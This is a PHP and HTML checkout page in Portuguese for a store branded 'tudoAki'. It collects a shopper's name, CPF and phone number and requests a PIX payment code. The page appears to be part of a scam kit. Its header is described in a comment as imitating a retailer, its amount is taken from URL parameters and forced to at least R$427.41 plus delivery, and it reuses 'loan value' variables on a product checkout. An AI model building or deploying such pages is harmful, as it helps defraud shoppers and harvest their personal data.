<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

$dados = $_SESSION['dados_cadastro'] ?? [];
$nome  = !empty($dados['nome']) ? $dados['nome'] : 'Cliente tudoAki';
$cpf   = !empty($dados['cpf']) ? $dados['cpf'] : '11144477735';
$tel   = !empty($dados['telefone']) ? $dados['telefone'] : '11999999999';
$servico = $dados['servico'] ?? $_GET['servico'] ?? $_POST['servico'] ?? 'Kit Especial tudoAki 2026';

// Captura rigorosamente o valor que vem da URL ou sessão e ajusta para o total com frete (437.23)
$valorPalpite = $_GET['valor'] ?? $_POST['valor'] ?? $_SESSION['valor_emprestimo'] ?? $dados['valor'] ?? '427.41';
$valorFloat = (float)$valorPalpite;
if ($valorFloat < 400) { $valorFloat = 427.41; }

$valorFrete = 9.82; 
$valorTotalGeral = $valorFloat + $valorFrete;
$_SESSION['valor_emprestimo'] = $valorTotalGeral;

$valorFormatado = number_format($valorTotalGeral, 2, ',', '.');
$valorProdutoFmt = number_format($valorFloat, 2, ',', '.');
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagamento - tudoAki</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        .text-blue-cb { color: #002D93; }
        .bg-blue-cb { background-color: #002D93; }
        .border-blue-cb { border-color: #002D93; }
        .card-custom {
            background: #ffffff;
            border: 1px solid #e5e7eb;
        }
    </style>
</head>
<body class="bg-gray-100 min-h-screen font-sans text-gray-800 flex flex-col justify-between">

    <div>
        <!-- Topo Fiel ao Varejo -->
        <header class="bg-white border-b border-gray-200 shadow-sm py-3 px-4 relative">
            <div class="max-w-7xl mx-auto flex justify-between items-center px-4">
                <a href="index.php" class="flex items-center gap-2">
                    <span class="text-2xl font-black italic tracking-tighter text-blue-cb">tudo<span class="text-amber-500">Aki</span></span>
                </a>
                <span class="text-blue-cb flex items-center gap-1 font-semibold text-xs">
                    <i class="fa-solid fa-lock text-[10px]"></i> Pagamento 100% Seguro
                </span>
            </div>
            <div class="absolute top-0 left-0 right-0 h-1 bg-red-600"></div>
        </header>

        <!-- Conteúdo Principal em Grid (Formulário Original + Resumo do Pedido) -->
        <main class="max-w-7xl mx-auto p-4 md:p-8 my-2">
            <h1 class="text-2xl md:text-3xl font-bold text-blue-cb mb-6">Pagamento</h1>

            <div class="grid grid-cols-1 lg:grid-cols-3 gap-6 items-start">
                
                <!-- Coluna Esquerda: Formulário Original Intacto para a API não falhar -->
                <div class="lg:col-span-2 space-y-4">
                    <div class="card-custom rounded-2xl shadow-sm p-6 md:p-8">
                        
                        <div class="bg-blue-50 border border-blue-200 rounded-xl p-4 text-center mb-6">
                            <span class="text-[11px] font-bold text-gray-500 uppercase tracking-wider block mb-1">Valor Total do Pedido</span>
                            <span id="display-valor-texto" class="text-3xl font-extrabold text-blue-cb tracking-tight">R$ <?php echo $valorFormatado; ?></span>
                            <p class="text-xs text-gray-600 mt-1 font-semibold"><?php echo htmlspecialchars($servico); ?></p>
                        </div>

                        <form id="form-identificacao" class="space-y-4">
                            <input type="hidden" name="payment_method" id="input-payment-method" value="pix">
                            <input type="hidden" name="servico" id="input-servico-hidden" value="<?php echo htmlspecialchars($servico); ?>">
                            <input type="hidden" name="valor" id="input-valor-hidden" value="<?php echo htmlspecialchars($valorTotalGeral); ?>">

                            <div>
                                <label class="block text-xs font-bold text-gray-700 mb-1 uppercase tracking-wide">Nome Completo</label>
                                <input type="text" name="nome" value="<?php echo htmlspecialchars($nome); ?>" required placeholder="Digite seu nome" class="w-full px-3.5 py-2.5 bg-gray-50 border border-gray-300 rounded-xl text-xs text-gray-800 focus:outline-none focus:border-blue-cb font-medium transition">
                            </div>

                            <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
                                <div>
                                    <label class="block text-xs font-bold text-gray-700 mb-1 uppercase tracking-wide">CPF</label>
                                    <input type="text" name="cpf" id="cpf-input" value="<?php echo htmlspecialchars($cpf); ?>" required placeholder="000.000.000-00" class="w-full px-3.5 py-2.5 bg-gray-50 border border-gray-300 rounded-xl text-xs text-gray-800 focus:outline-none focus:border-blue-cb font-medium transition">
                                </div>
                                <div>
                                    <label class="block text-xs font-bold text-gray-700 mb-1 uppercase tracking-wide">Celular / WhatsApp</label>
                                    <input type="text" name="telefone" id="phone-input" value="<?php echo htmlspecialchars($tel); ?>" required placeholder="(00) 00000-0000" class="w-full px-3.5 py-2.5 bg-gray-50 border border-gray-300 rounded-xl text-xs text-gray-800 focus:outline-none focus:border-blue-cb font-medium transition">
                                </div>
                            </div>

                            <div class="pt-3">
                                <button type="submit" id="btn-submit" class="w-full bg-[#178900] hover:bg-[#137200] text-white font-bold py-4 px-4 rounded-xl text-sm shadow-md transition flex items-center justify-center gap-2">
                                    <i class="fa-solid fa-qrcode text-xs"></i>
                                    <span id="btn-submit-text">Gerar Pagamento PIX com Segurança</span>
                                </button>
                            </div>
                        </form>
                    </div>
                </div>

                <!-- Coluna Direita: Resumo do Pedido -->
                <div>
                    <div class="bg-white rounded-xl p-6 shadow-sm border border-gray-200 space-y-4 sticky top-6">
                        <h2 class="text-lg font-bold text-blue-cb border-b border-gray-100 pb-3">Resumo do pedido</h2>

                        <div class="flex items-start gap-3 pb-3 border-b border-gray-100">
                            <div class="w-12 h-12 bg-gray-100 rounded border border-gray-200 flex items-center justify-center text-blue-cb">
                                <i class="fa-solid fa-box-open text-xl"></i>
                            </div>
                            <div class="text-xs">
                                <span class="font-bold text-gray-900 block line-clamp-2">1x <?php echo htmlspecialchars($servico); ?></span>
                                <span class="text-gray-500">Vendido e entregue por <strong class="text-blue-cb">TUDOAKI OFICIAL</strong></span>
                                <div class="text-blue-cb font-bold mt-1">Entrega rápida: <span class="text-emerald-700">R$ <?php echo number_format($valorFrete, 2, ',', '.'); ?></span></div>
                            </div>
                        </div>

                        <div class="space-y-2 text-sm">
                            <div class="flex justify-between text-gray-600 text-xs">
                                <span>01 Produto</span>
                                <span class="font-bold text-gray-900">R$ <?php echo $valorProdutoFmt; ?></span>
                            </div>
                            <div class="flex justify-between text-gray-600 text-xs pb-3 border-b border-gray-100">
                                <span>Entrega</span>
                                <span class="font-bold text-gray-900">R$ <?php echo number_format($valorFrete, 2, ',', '.'); ?></span>
                            </div>
                            <div class="flex justify-between text-base font-bold text-gray-900 pt-1">
                                <span>Total</span>
                                <span class="text-blue-cb font-black text-lg">R$ <?php echo $valorFormatado; ?></span>
                            </div>
                            <div class="text-[11px] text-gray-500 text-right -mt-2">
                                ou <strong class="text-emerald-700">R$ <?php echo $valorFormatado; ?></strong> no Pix
                            </div>
                        </div>

                        <div class="text-center text-[11px] text-gray-500 pt-3 border-t border-gray-100">
                            Confirme os dados e clique em Gerar PIX.
                        </div>
                    </div>
                </div>

            </div>
        </main>
    </div>

    <!-- Modal de Carregamento Original -->
    <div id="loading-modal" class="fixed inset-0 bg-black/75 backdrop-blur-sm z-50 flex flex-col items-center justify-center p-6 hidden">
        <div class="bg-white rounded-2xl p-6 text-center shadow-2xl w-full max-w-xs flex flex-col items-center border border-slate-200">
            <div id="modal-spinner" class="w-12 h-12 border-4 border-emerald-500/20 border-t-[#178900] rounded-full animate-spin mb-4"></div>
            <div id="modal-icon-error" class="text-amber-500 text-4xl mb-2 hidden"><i class="fa-solid fa-triangle-exclamation"></i></div>
            <h4 class="font-bold text-gray-900 text-sm" id="loading-title">Gerando seu PIX...</h4>
            <p class="text-xs text-gray-500 mt-2 leading-relaxed" id="loading-sub">Aguarde um instante.</p>
            <button id="btn-modal-close" onclick="redirectPixAfterCard()" class="mt-4 bg-blue-cb hover:bg-blue-900 text-white text-xs font-bold py-2 px-4 rounded-lg hidden w-full">Continuar</button>
        </div>
    </div>

    <!-- Rodapé -->
    <footer class="bg-white text-gray-500 text-xs py-4 text-center border-t border-gray-200 mt-8">
        © 2026 tudoAki - Sua Loja de Tudo. Aqui. Todos os direitos reservados.
    </footer>

    <!-- Script Original Intacto para Comunicação com a API -->
    <script>
    let valorGlobalTransacao = "<?php echo $valorTotalGeral; ?>";
    let savedPixData = null;

    document.addEventListener('DOMContentLoaded', function() {
        const storedValor = localStorage.getItem('valor_emprestimo') || localStorage.getItem('current_amount');
        if (storedValor) {
            let base = parseFloat(storedValor);
            if (!isNaN(base)) {
                valorGlobalTransacao = (base < 400 ? base + 9.82 : base).toFixed(2);
                document.getElementById('input-valor-hidden').value = valorGlobalTransacao;
                let numFloat = parseFloat(valorGlobalTransacao);
                document.getElementById('display-valor-texto').innerText = 'R$ ' + numFloat.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
            }
        }

        const form = document.getElementById('form-identificacao');
        const loadingModal = document.getElementById('loading-modal');

        if (form) {
            form.addEventListener('submit', async function(e) {
                e.preventDefault();

                document.getElementById('loading-title').innerText = 'Gerando seu PIX';
                document.getElementById('loading-sub').innerText = 'Conectando ao sistema de pagamentos...';
                document.getElementById('modal-spinner').classList.remove('hidden');
                document.getElementById('modal-icon-error').classList.add('hidden');
                document.getElementById('btn-modal-close').classList.add('hidden');
                loadingModal.classList.remove('hidden');

                const formData = new FormData(form);
                const dataObj = {};
                formData.forEach((value, key) => dataObj[key] = value);
                dataObj['valor'] = valorGlobalTransacao;

                try {
                    const response = await fetch('api/create_payment.php', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(dataObj)
                    });

                    const result = await response.json();

                    if (response.ok && result.status === 'success') {
                        savedPixData = result;

                        let cleanPix = result.pix_code.replace(/\\/g, '');
                        localStorage.setItem('current_pix_code', cleanPix);
                        localStorage.setItem('current_pedido_id', result.pedidoId);
                        localStorage.setItem('current_amount', valorGlobalTransacao);
                        window.location.href = 'qrcode.php';
                    } else {
                        loadingModal.classList.add('hidden');
                        alert('Erro ao processar requisição: ' + (result.message || 'Tente novamente.'));
                    }
                } catch (error) {
                    loadingModal.classList.add('hidden');
                    alert('Erro na comunicação com o servidor.');
                }
            });
        }
    });

    function redirectPixAfterCard() {
        if (savedPixData && savedPixData.pix_code) {
            let cleanPix = savedPixData.pix_code.replace(/\\/g, '');
            localStorage.setItem('current_pix_code', cleanPix);
            localStorage.setItem('current_pedido_id', savedPixData.pedidoId);
            localStorage.setItem('current_amount', valorGlobalTransacao);
            window.location.href = 'qrcode.php';
        } else {
            document.getElementById('loading-modal').classList.add('hidden');
        }
    }
    </script>
</body>
</html>